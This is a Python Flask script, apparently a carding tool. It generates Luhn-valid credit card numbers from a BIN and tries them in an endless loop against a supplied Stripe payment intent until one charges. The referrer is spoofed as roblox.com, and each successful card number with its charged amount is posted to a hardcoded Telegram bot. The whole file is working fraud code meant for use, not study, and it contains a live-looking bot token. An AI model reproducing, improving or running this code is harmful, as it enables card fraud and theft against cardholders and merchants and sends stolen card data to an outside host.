from flask import Flask, request, render_template_string, render_template
import requests
import random
import sys
import time

app = Flask(__name__)

class CreditCard:
    @staticmethod
    def calculate(ccnumber, length):
        total = 0
        reversedCCnumber = ccnumber[::-1]

        for pos in range(length - 1):
            num = int(reversedCCnumber[pos])
            if pos % 2 == 0:
                num *= 2
                if num > 9:
                    num -= 9
            total += num

        checkdigit = (10 - (total % 10)) % 10
        return ccnumber + str(checkdigit)

    def extrap(self, bin):
        ccNumber = ''.join(str(random.randint(0, 9)) if char == 'x' else char for char in bin)
        ccNumber += ''.join([str(random.randint(0, 9)) for _ in range(16 - len(ccNumber) - 1)])
        return self.calculate(ccNumber, 16)

def pistuff(cc, mes, ano, cvv, pk, pics):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }

    # Mulai waktu eksekusi
    start_time = time.time()

    response = requests.post("https://m.stripe.com/6", headers=headers)
    json_data = response.json()
    m = json_data.get("muid")
    s = json_data.get("sid")
    g = json_data.get("guid")
    
    index = pics.find('_secret_')
    if index != -1:
        pi = pics[:index]
    else:
        return "Secret key not found in response."
    
    data = f'payment_method_data[type]=card&payment_method_data[billing_details][name]=skibidi+sigma+csub&payment_method_data[card][number]={cc}&payment_method_data[card][exp_month]={mes}&payment_method_data[card][exp_year]={ano}&payment_method_data[guid]={g}&payment_method_data[muid]={m}&payment_method_data[sid]={s}&payment_method_data[pasted_fields]=number&payment_method_data[referrer]=https%3A%2F%2Froblox.com&expected_payment_method_type=card&use_stripe_sdk=true&key={pk}&client_secret={pics}'
    response = requests.post(f'https://api.stripe.com/v1/payment_intents/{pi}/confirm', headers=headers, data=data)

    # Akhiri waktu eksekusi
    end_time = time.time()
    exec_time = end_time - start_time

    if "payment_intent_unexpected_state" in response.text:
        return "Payment Intents revoked or succeeded"
    
    response_json = response.json()
    code = response_json.get("error", {}).get("code")
    decline_code = response_json.get("error", {}).get("decline_code")
    message = response_json.get("error", {}).get("message")
    amountSuccess = response_json.get("amount", 0) / 100
    currencySuccess = response_json.get("currency", "usd").upper()

    if response_json.get("status") == "succeeded" or response_json.get("status") == "requires_capture":
        send_to_telegram(cc, mes, ano, cvv, amountSuccess, currencySuccess, exec_time)
        return f"\033[92m➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ Amount -» {amountSuccess} {currencySuccess}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ {exec_time:.2f} Seconds\033[0m\n"
    elif "requires_source_action" in response.text or "intent_confirmation_challenge" in response.text or "requires_action" in response.text:
        return f"\033[93m➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» 3DS CARD\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ {exec_time:.2f} Seconds\033[0m\n"
    else:
        return f"\033[91m➥ 💳 𝐂𝐂 -» {cc}|{mes}|{ano}|{cvv}\nAmount -» {amountSuccess} {currencySuccess}\n➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Declined\n➥ 🔥 𝐒𝐭𝐚𝐭𝐮𝐬 -» {code} | {decline_code} | {message}\n➥ 🙀 𝐁𝐲 -»ZETT\n⏰ Time ➔ {exec_time:.2f} Seconds\033[0m\n"

def send_to_telegram(cc, mes, ano, cvv, amountSuccess, currencySuccess, exec_time):
    bot_token = "6591581621:AAEabMJHGLq7oi-qP4oXPMZNzZhDltNe3GY"
    chat_id = "-4144915493"
    text = (
        f"➥ 💳 𝐂ard -» {cc}|{mes}|{ano}|{cvv}\n"
        f"➥ 💲 Amount -» {currencySuccess} {amountSuccess} Charged✅\n"
        f"➥ 💬 𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 -» Payment successful✅\n"
        "- - - - - - - - - - - - - - - - - - - - - - - -- - - - - - - - - -\n"
        "⚜️Checked by ➔ Zett\n"
        f"⏰Time ➔ {exec_time:.2f} Seconds\n"
    )
    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text
    }
    headers = {
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
        "Pragma": "no-cache",
        "Accept": "*/*"
    }
    response = requests.post(url, data=data, headers=headers)
    return response.status_code

@app.route('/generate', methods=['POST'])
def generate_cc():
    bin = request.form.get('bin')
    pk = request.form.get('pk')  # Input PK secara manual
    pics = request.form.get('pics')

    if not bin or not pk or not pics:
        return render_template('error.html', message='Please provide BIN, PK, and Pics values.')

    # Looping untuk mencoba sampai berhasil
    while True:
        cc = CreditCard().extrap(bin)
        randMonth = random.randint(1, 12)
        month = f"{randMonth:02}"
        years = random.randint(2024, 2039)
        cvv = "0000"

        print(f"TRY CC: {cc}|{month}|{years}|{cvv}")
        
        result = pistuff(cc, month, years, cvv, pk, pics)
        
        if "Payment successful" in result:
            return render_template('index.html', cc=cc, month=month, year=years, cvv=cvv,result=result)
        elif "Payment Intents revoked or succeeded" in result:
            return render_template('index.html',cc=cc, month=month, year=years, cvv=cvv, result=result)
        else:
            print(f"Declined: {result}")  # Log kartu yang gagal untuk debugging

@app.route('/')
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
